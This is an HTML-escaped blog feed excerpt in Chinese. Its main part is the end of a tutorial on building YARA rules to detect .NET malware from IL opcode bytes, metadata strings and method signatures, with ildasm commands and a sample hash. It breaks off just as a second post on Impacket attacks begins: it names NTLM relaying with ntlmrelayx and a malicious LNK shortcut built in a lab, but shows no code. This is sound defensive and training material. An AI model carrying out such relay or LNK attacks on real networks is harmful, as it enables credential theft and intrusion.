&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;28 ?? ?? ?? 0A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;IL代码的完整YARA规则可能如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rule IL_Code_Signature {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    strings:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $op1 = { 20 00 01 00 00 }  // ldc.i4 256
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $op2 = { 8D 19 00 00 01 }  // newarr [mscorlib]System.String
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $op3 = { 28 ?? ?? ?? 0A }  // call System.Linq.Enumerable::Range(int32, int32)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    condition:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        all of them
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;注意我们保留了数组大小和Range(0,256)调用的整数值。根据上下文和这些值变化的概率，可能需要通配这些值。表示加密密钥、活动ID或版本号的值经常变化。&lt;/p&gt;
&lt;p&gt;一些文章建议通配包括令牌类型在内的完整令牌，然而这样做通常没有优势。相反，除了丢失类型信息外，如果剩余的字节序列长度不足，这可能导致性能不佳。对于YARA模式，建议至少4个连续字节没有通配符，因为YARA的搜索算法首先用4字节子字符串（称为原子）进行扫描（见[4]）。&lt;/p&gt;
&lt;h2 id=&#34;检测方法的每个部分&#34;&gt;检测方法的每个部分
&lt;/h2&gt;&lt;p&gt;方法由主体、方法名、参数名和签名组成。在.NET程序集中，这些保存在不同的流中，因此位于程序集的不同位置。&lt;/p&gt;
&lt;p&gt;假设我们想为YARA规则使用所有这些信息。&lt;/p&gt;
&lt;p&gt;首先，方法名和参数名保存在#Strings流中。因此我们知道方法名和参数名将被零字节包围并以UTF-8格式保存。这不仅在我们需要仅基于截图编写规则时有用，而且在有样本时也能节省时间，因为我们不需要在十六进制编辑器中查找这些名称的表示形式。&lt;/p&gt;
&lt;p&gt;其次，IL代码引用的任何字符串都以UTF-16编码存储在#US堆中。我们已经在案例1中讨论了#String和#US字符串。&lt;/p&gt;
&lt;p&gt;第三，方法主体是实际的IL代码。我们在上一节讨论了这部分。&lt;/p&gt;
&lt;p&gt;最后，方法签名保存在#Blob流中。上下文中的方法签名指方法期望的调用约定、参数类型和返回类型，不应与检测规则混淆。此类方法签名的构建如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;method_sig ::= &amp;lt;callconven_method&amp;gt; &amp;lt;num_of_args&amp;gt; &amp;lt;return_type&amp;gt; [&amp;lt;arg_type&amp;gt;[,&amp;lt;arg_type&amp;gt;]*]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ildasm.exe显示方法签名的字节序列。使用方法完全限定名，显示字节序列的合适命令是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ILDasm.exe /text /bytes /nobar /item=&amp;#34;ns11.Class9::method_22&amp;#34; sample
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;以下示例输出显示最后一行中的方法签名字节序列：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.method public hidebysig instance void 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          method_22(class [System.Drawing]System.Drawing.Imaging.BitmapData Param_55, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    class [mscorlib]System.IO.MemoryStream Param_56) cil managed 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SIG: 20 02 01 12 29 12 2D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;方法签名含义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0x20是调用约定IMAGE_CEE_CS_CALLCONV_HASTHIS，表示这是一个实例方法&lt;/li&gt;
&lt;li&gt;0x02是参数数量，即2&lt;/li&gt;
&lt;li&gt;0x01是返回类型VOID&lt;/li&gt;
&lt;li&gt;0x12 0x29是第一个参数，0x12引用CLASS类型，0x29是类引用的编码令牌&lt;/li&gt;
&lt;li&gt;0x12 0x2D是第二个参数，0x12引用CLASS类型，0x2D是类引用的编码令牌&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;正如我们在IL代码模式中通配RID一样，我们也应该通配方法签名中的编码令牌。编码令牌是令牌的压缩形式，允许比4字节更小的尺寸。它们不用于IL代码，但用于内部结构如方法签名。&lt;/p&gt;
&lt;p&gt;此外，我们在模式前添加长度0x07，因为每个#Blob条目都需要它。&lt;/p&gt;
&lt;p&gt;此方法签名的最终十六进制模式是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;07 20 02 01 12 ?? 12 ??
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;方法签名模式本身是一个弱数据点。此外，除非扫描引擎解析.NET元数据，否则方法签名不能与方法主体和名称关联。因此，对于纯模式搜索，任何具有相同方法签名的方法都会匹配。因此，它对为YARA规则添加上下文很有用，但肯定不足以独立使用。&lt;/p&gt;
&lt;h2 id=&#34;案例2的最终规则&#34;&gt;案例2的最终规则
&lt;/h2&gt;&lt;p&gt;基于上一节的知识，我们为Buffer方法的YARA规则添加更多字符串：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;rule&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Buffer_Method_Signature&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;strings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Buffer&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;param_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;us_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C5&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;58&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;X2&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;trailing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;byte&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;class_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Small&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;WindowsFormsApp54&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;il_code1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ldc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i4&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;il_code2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;??&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;??&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;??&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Enumerable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Range&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method_sig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;05&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;D&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;05&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;condition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;param_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;us_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;il_code1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;il_code2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method_sig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;class_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;代码引用字符串&amp;quot;X2&amp;rdquo;。虽然它只有2个字符，但我们利用#US元素有前置长度和尾随0的知识，适当增加了$us_string模式长度。&lt;/p&gt;
&lt;p&gt;此外，我们为此练习包含类名和命名空间。&lt;/p&gt;
&lt;p&gt;我们通过以下命令提取方法签名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ildasm.exe /text /bytes /nobar /item=&amp;#34;WindowsFormsApp54.Small::Buffer&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;方法签名的字节序列0x05 0x00 0x01 0x1D 0x05 0x0E组成如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0x05是前置长度5&lt;/li&gt;
&lt;li&gt;0x00是默认调用约定IMAGE_CEE_CS_CALLCONV_DEFAULT&lt;/li&gt;
&lt;li&gt;0x01是参数数量&lt;/li&gt;
&lt;li&gt;0x1D表示返回类型是SZARRAY&lt;/li&gt;
&lt;li&gt;0x05表示数组基础类型是byte&lt;/li&gt;
&lt;li&gt;0x0E表示第一个参数是string类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不需要通配符，因为没有编码令牌存在。&lt;/p&gt;
&lt;h2 id=&#34;net-yara规则技巧&#34;&gt;.NET YARA规则技巧
&lt;/h2&gt;&lt;p&gt;了解内部结构有助于为规则添加上下文。这会产生更准确和鲁棒的检测规则，因为我们增加了模式嵌入正确结构的可能性。&lt;/p&gt;
&lt;p&gt;此外，它增加了我们在YARA中的表达能力，在处理缺失信息时带来更多灵活性和更少错误。它还提高了效率，因为我们不需要在十六进制编辑器中查找正确格式。&lt;/p&gt;
&lt;p&gt;这不仅适用于.NET。其他类型的规则，如CPython字节码的规则，也能从考虑其文件和数据结构中受益。&lt;/p&gt;
&lt;p&gt;可读性和可维护性的价值不应低估。需要逆向工程样本代码以确定其检测内容的规则，通常需要与从头编写类似规则相同的质量检查和时间维护。IL代码的YARA字节模式应始终包含检测到的IL代码的反汇编或反编译注释。&lt;/p&gt;
&lt;h2 id=&#34;参考文献&#34;&gt;参考文献
&lt;/h2&gt;&lt;p&gt;[1] Brian Wallace, 2015, &amp;ldquo;使用.NET GUID帮助搜寻恶意软件&amp;rdquo;, VirusBulletin&lt;br&gt;
[2] Serge Lidin, 2014, &amp;ldquo;.NET IL汇编器&amp;rdquo;, Apress&lt;br&gt;
[3] &lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/metadata/corcallingconvention-enumeration&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/metadata/corcallingconvention-enumeration&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;样本哈希&#34;&gt;样本哈希
&lt;/h2&gt;&lt;p&gt;f9ee3eff3345ea280c01d5fce5461b24c537cf6c3dfadc626ef73eed815c2008&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用Azure实验室进行Impacket攻击基础教程</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8azure%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%BF%9B%E8%A1%8Cimpacket%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</link>
        <pubDate>Sat, 02 Aug 2025 10:34:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8azure%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%BF%9B%E8%A1%8Cimpacket%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;impacket攻击基础与azure实验室搭建&#34;&gt;Impacket攻击基础与Azure实验室搭建
&lt;/h1&gt;&lt;h2 id=&#34;概述&#34;&gt;概述
&lt;/h2&gt;&lt;p&gt;本文是对Impacket工具集作者SecureAuthCorp及开源维护者的致敬，将介绍该工具包的核心技术应用。项目地址：https://github.com/SecureAuthCorp/impacket&lt;/p&gt;
&lt;h2 id=&#34;实验室搭建&#34;&gt;实验室搭建
&lt;/h2&gt;&lt;p&gt;使用ARM模板部署（doazlab.com或github.com/DefensiveOrigins/DO-LAB）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;认证可创建资源的Azure订阅&lt;/li&gt;
&lt;li&gt;部署包含域控制器、加入的工作站和Ubuntu系统的实验环境&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ntlmrelayxpy攻击实战&#34;&gt;ntlmrelayx.py攻击实战
&lt;/h2&gt;&lt;h3 id=&#34;恶意lnk文件攻击mitre-attck-t1204&#34;&gt;恶意LNK文件攻击（MITRE ATT&amp;amp;CK T1204）
&lt;/h3&gt;&lt;p&gt;通过PowerShell创建诱导性快捷文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
